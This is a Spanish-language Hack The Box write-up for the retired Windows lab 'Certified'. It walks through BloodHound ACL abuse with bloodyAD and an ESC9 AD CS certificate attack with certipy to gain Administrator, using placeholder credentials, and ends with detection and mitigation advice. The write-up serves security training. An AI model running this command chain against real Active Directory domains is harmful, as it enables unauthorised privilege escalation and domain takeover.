---
machine: Certified
os: Windows
difficulty: Medium
platform: Hack The Box
category: Active Directory
state: Retired
pwned: false
tags: [windows, active-directory, adcs, esc9, certipy, pkinit]
---

# Certified — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin credenciales ni flags reales.

## Resumen

Reto “assume breach”: se parte de una cuenta de bajo privilegio. BloodHound muestra `WriteOwner` sobre el grupo Management, `GenericWrite` sobre `Management_SVC` y `GenericAll` sobre `CA_Operator`. Ese control permite modificar el UPN de la víctima y abusar de ESC9 en AD CS para obtener un certificado como Administrator.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
netexec smb <IP> -u <USER> -p '<PASSWORD>' --shares
bloodhound-python -u <USER> -p '<PASSWORD>' -d certified.htb -ns <IP> -c All
```

BloodHound dibuja la ruta:

```text
judith.mader -> WriteOwner -> Management
Management -> GenericWrite -> Management_SVC
Management_SVC -> GenericAll -> CA_Operator
```

Se toma posesión del grupo y se añade el usuario:

```bash
bloodyAD -d certified.htb -u <USER> -p '<PASSWORD>' --host <DC> \
  set owner Management <USER>
bloodyAD -d certified.htb -u <USER> -p '<PASSWORD>' --host <DC> \
  add groupMember Management <USER>
```

## Acceso inicial

Con `GenericWrite` sobre `Management_SVC` se puede cambiar su contraseña o su UPN. Se usa para obtener una sesión con ese usuario y, desde ahí, controlar `CA_Operator`.

```bash
netexec winrm <IP> -u Management_SVC -p '<PASSWORD>'
```

## Escalada

Se enumera AD CS:

```bash
certipy find -u <USER> -p '<PASSWORD>' -dc-ip <IP> -vulnerable -stdout
```

La plantilla vulnerable no exige el Security Extension (ESC9). `GenericAll` sobre `CA_Operator` permite cambiar su UPN a `administrator`; se solicita el certificado, se restaura el UPN y se autentica con PKINIT:

```bash
certipy account update -u Management_SVC -p '<PASSWORD>' -user CA_Operator -upn administrator
certipy req -u CA_Operator -p '<PASSWORD>' -ca <CA_NAME> -template <TEMPLATE> -dc-ip <IP>
certipy account update -u Management_SVC -p '<PASSWORD>' -user CA_Operator -upn ca_operator@certified.htb
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

El TGT/PFX permite acceder al DC como Administrator y volcar las flags.

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

## Lecciones

- `WriteOwner` sobre un grupo es un privilegio efectivo aunque no sea “admin”.
- ESC9 combina un derecho sobre la víctima con una plantilla sin Security Extension.
- Cambiar el UPN y restaurarlo reduce la huella, pero deja eventos 4738.
- La autenticación por certificado (PKINIT) evita depender de la contraseña.

## Detección y mitigación

- Auditar `WriteOwner`, `GenericWrite` y `GenericAll` sobre grupos y usuarios.
- Revisar plantillas con `CT_FLAG_NO_SECURITY_EXTENSION`.
- Alertar de cambios de UPN (4738) y emisiones de certificados inusuales.
- Aplicar el parche de ESC9 y separar roles de CA.

## Referencias

- <https://0xdf.gitlab.io/2025/03/15/htb-certified.html>
- <https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7>
- <https://attack.mitre.org/techniques/T1649/>
